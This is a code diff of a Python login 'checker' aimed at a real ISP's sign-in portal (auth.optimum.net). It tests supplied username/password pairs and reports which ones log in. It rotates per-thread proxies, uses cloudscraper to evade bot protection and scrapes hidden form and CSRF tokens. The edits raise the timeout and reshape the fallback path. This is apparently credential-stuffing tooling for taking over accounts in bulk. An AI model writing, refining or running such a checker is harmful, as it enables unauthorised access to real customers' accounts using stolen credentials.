@@ -1,5 +1,5 @@
 """
-Checker for Optimum (auth.optimum.net) – Auth0 login with proper session handling.
+Checker for Optimum (auth.optimum.net) – with longer timeout and cloudscraper.
 """
 import re
 import threading
@@ -14,7 +14,7 @@ except ImportError:
 
 BASE_URL = "https://auth.optimum.net"
 LOGIN_URL = "https://auth.optimum.net/u/login?state=hKFo2SB6SWc0M3pNX3JhV185OTZNYVJocjllVUpGNmFGMkJiaKFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIEFOVWdZQnJOd3Q0MGZLb0ZRSUp2Ui1xRXJxN3FxYnlDo2NpZNkgdTVsQk8xQnQ2REVxeHBjcmllVlJjczB4a2xGbWJrWHc"
-TIMEOUT = 20
+TIMEOUT = 30  # increased from 20
 
 def check(username: str, password: str) -> Tuple[bool, str]:
     proxy = getattr(threading.current_thread(), 'proxy', None)
@@ -42,36 +42,33 @@ def check(username: str, password: str) -> Tuple[bool, str]:
         if resp.status_code != 200:
             return False, f"Failed to load login page (HTTP {resp.status_code})"
 
-        # If we got redirected to an error page, we may need to retry with a fresh session
+        # If we got redirected to an error page, retry with fresh session
         if "error" in resp.url or "invalid" in resp.url.lower():
-            # Sometimes the first request fails; try with cloudscraper fallback
-            if not HAS_CLOUDSCRAPER:
+            # Try again with cloudscraper if available
+            if HAS_CLOUDSCRAPER:
+                session = cloudscraper.create_scraper()
+                if proxy:
+                    session.proxies = {"http": proxy, "https": proxy}
+                session.headers.update({
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.5",
+                    "Origin": BASE_URL,
+                    "Referer": LOGIN_URL,
+                })
+                resp = session.get(LOGIN_URL, timeout=TIMEOUT)
+                if resp.status_code != 200:
+                    return False, f"Retry failed (HTTP {resp.status_code})"
+            else:
                 return False, "Login page returned error – try installing cloudscraper"
-            # Refresh session and try again
-            session = cloudscraper.create_scraper()
-            if proxy:
-                session.proxies = {"http": proxy, "https": proxy}
-            session.headers.update({
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Origin": BASE_URL,
-                "Referer": LOGIN_URL,
-            })
-            resp = session.get(LOGIN_URL, timeout=TIMEOUT)
-            if resp.status_code != 200:
-                return False, f"Retry failed (HTTP {resp.status_code})"
 
         html = resp.text
 
-        # Find the form action – usually the same URL or a relative path
+        # Find the form action
         form_action = LOGIN_URL
         match = re.search(r'<form[^>]*action="([^"]+)"', html, re.I)
         if match:
             form_action = urljoin(BASE_URL, match.group(1))
-        else:
-            # Auth0 often submits to the same URL with 'username' and 'password' fields
-            pass
 
         # Extract all hidden inputs (state, client_id, csrf, etc.)
         payload = {"username": username, "password": password}
@@ -85,9 +82,8 @@ def check(username: str, password: str) -> Tuple[bool, str]:
         if csrf_meta:
             payload["csrf_token"] = csrf_meta.group(1)
 
-        # If still no hidden fields, maybe the form uses a JSON API – try to parse from JavaScript
+        # If still no hidden fields, try parsing config from JavaScript
         if not any(k for k in payload if k not in ["username", "password"]):
-            # Look for a JavaScript variable with config
             js_match = re.search(r'var\s+config\s*=\s*({[^;]+});', html, re.I)
             if js_match:
                 try:
@@ -120,13 +116,9 @@ def check(username: str, password: str) -> Tuple[bool, str]:
         if "logout" in html or "dashboard" in html or "welcome" in html:
             return True, "Login successful"
 
-        # Check if we are still on a login page (contains username/password fields)
+        # If we are still on a login page (contains username/password fields)
         if 'name="username"' in html or 'name="password"' in html:
             return False, "Login failed – still on login page"
-
-        # If we see a "forgot password" link and no error, it's likely a failure
-        if "forgot password" in html:
-            return False, "Login failed – likely invalid credentials"
 
         return False, "Login failed – unknown response"
 
